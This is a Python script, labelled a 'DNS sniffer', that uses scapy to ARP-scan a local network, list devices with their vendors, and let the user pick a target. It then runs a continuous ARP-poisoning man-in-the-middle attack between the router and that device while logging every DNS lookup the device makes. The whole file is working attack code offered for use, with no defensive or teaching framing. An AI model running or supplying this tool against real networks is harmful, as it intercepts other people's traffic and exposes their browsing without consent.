import argparse
import threading
from colorama import Fore, Style
from time import strftime, localtime
from scapy.all import arp_mitm, sniff, DNS, ARP, Ether, srp
from mac_vendor_lookup import MacLookup, VendorNotFoundError

parser = argparse.ArgumentParser(description='DNS sniffer')
parser.add_argument('--network', help='Network to scan (eg, "192.168.0.0/24")', required=True)
parser.add_argument('--iface', help='Interface to use for attack', required=True)
parser.add_argument('--routerip', help='IP of your router', required=True)
opts = parser.parse_args()

def arp_scan(network, iface):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=network), timeout=5, iface=iface, verbose=False)
    print(f"{Fore.RED}############ NETWORK DEVICES ####################{Style.RESET_ALL}")
    for i in ans:
        mac = i.answer[ARP].hwsrc
        ip = i.answer[ARP].psrc
        try:
            vendor = MacLookup().lookup(mac)
        except VendorNotFoundError:
            vendor = 'unrecognized device'
        print(f"{Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})")
    return input('Pick a device IP: ')

class Device:
    def __init__(self, router_ip, target_ip, iface):
        self.router_ip = router_ip
        self.target_ip = target_ip
        self.iface = iface

    def mitm(self):
        while True:
            try:
                arp_mitm(self.router_ip, self.target_ip, self.iface, verbose=False)
            except OSError:
                print("IP issues, we will try again")
                continue

    def capture(self):
        sniff(iface=self.iface, prn=self.dns, filter=f"src host {self.target_ip} and udp port 53", store=0)

    def dns(self, pkt):
        if DNS in pkt and pkt[DNS].qd:
            record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
            time = strftime("%m/%d/%Y %H:%M:%S", localtime())
            print(f"[{Fore.GREEN}{time} | {Fore.BLUE}{self.target_ip} -> {Fore.RED}{record}{Style.RESET_ALL}]")

    def watch(self):
        thread_1 = threading.Thread(target=self.mitm,args=())
        thread_2 = threading.Thread(target=self.capture,args=())
        thread_1.daemon = True #added to allow ctrl+c
        thread_2.daemon = True #added to allow ctrl+c
        thread_1.start()
        thread_2.start()
        try:
            while True:
                thread_1.join(1)
                thread_2.join(1)
                if not thread_1.is_alive() and not thread_2.is_alive():
                    break
        except KeyboardInterrupt:
            print("\nExiting...")
            return

if __name__ == '__main__':
    target_ip = arp_scan(opts.network, opts.iface)
    device = Device(opts.routerip, target_ip, opts.iface)
    device.watch()